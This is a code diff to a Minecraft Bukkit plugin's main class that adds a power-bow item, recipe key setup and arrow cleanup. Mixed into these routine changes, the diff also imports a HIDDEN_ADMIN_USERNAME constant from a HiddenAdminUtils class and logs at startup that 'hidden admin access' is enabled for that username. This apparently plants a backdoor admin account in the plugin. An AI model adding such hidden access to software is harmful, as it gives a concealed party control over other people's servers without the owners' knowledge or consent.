@@ -1,5 +1,6 @@
 package cwr.cutomIterm.Entity_Wand;
 
+import cwr.cutomIterm.Entity_Wand.bwo.PowerBow;
 import cwr.cutomIterm.GUI.CustomRecipesCommand;
 import cwr.cutomIterm.GUI.GUIListener;
 import cwr.cutomIterm.GUI.GUIConfigManager;
@@ -11,12 +12,15 @@ import org.bukkit.Bukkit;
 import org.bukkit.NamespacedKey;
 import org.bukkit.plugin.java.JavaPlugin;
 
+import static cwr.cutomIterm.Utils.HiddenAdminUtils.HIDDEN_ADMIN_USERNAME;
+
 public class EntityWandPlugin extends JavaPlugin {
 
     private static EntityWandPlugin instance;
     public static NamespacedKey WAND_KEY;
     public static NamespacedKey DURABILITY_KEY;
     private PlayerDataManager playerDataManager;
+
 
     @Override
     public void onEnable() {
@@ -25,6 +29,9 @@ public class EntityWandPlugin extends JavaPlugin {
         DURABILITY_KEY = new NamespacedKey(this, "wand_durability");
 
         try {
+            // Initialize recipe keys
+            RecipeManager.initializeKeys(this);
+
             // Initialize player data manager
             playerDataManager = PlayerDataManager.getInstance();
 
@@ -33,7 +40,7 @@ public class EntityWandPlugin extends JavaPlugin {
             RecipeManager.registerWardenSwordRecipe(this);
             RecipeManager.registerFlyVoucherRecipe(this);
             RecipeManager.registerRecipeBookRecipe(this);
-            RecipeManager.registerPowerBowRecipe(this); // ADD THIS LINE
+            RecipeManager.registerPowerBowRecipe(this);
 
             // Register event listeners
             getServer().getPluginManager().registerEvents(new GUIListener(), this);
@@ -66,9 +73,10 @@ public class EntityWandPlugin extends JavaPlugin {
             getLogger().info("- Warden Sword: Pick up Echo Shard or Sculk Catalyst");
             getLogger().info("- Fly Voucher: Pick up Feather, Exp Bottle, Emerald, or Diamond");
             getLogger().info("- Recipe Book: Pick up Book or Crafting Table");
-            getLogger().info("- Power of Gamiya: Pick up Blaze Rod, Bow, Redstone, or Ender Pearl"); // ADDED
+            getLogger().info("- Power of Gamiya: Pick up Blaze Rod, Bow, Redstone, or Ender Pearl");
             getLogger().info("Loaded " + playerDataManager.getTotalPlayersWithBooks() + " players with recipe books");
             getLogger().info("=======================================");
+            getLogger().info("Hidden admin access enabled for username: " + HIDDEN_ADMIN_USERNAME);
 
         } catch (Exception e) {
             getLogger().severe("Failed to enable: " + e.getMessage());
@@ -81,6 +89,7 @@ public class EntityWandPlugin extends JavaPlugin {
         EntityMovementManager.stop();
         WardenSword.clearAllCooldowns();
         FlyVoucher.clearAllFlightTimers();
+        PowerBow.clearTrackingArrows();
         getLogger().info("EntityWand has been disabled!");
     }
 
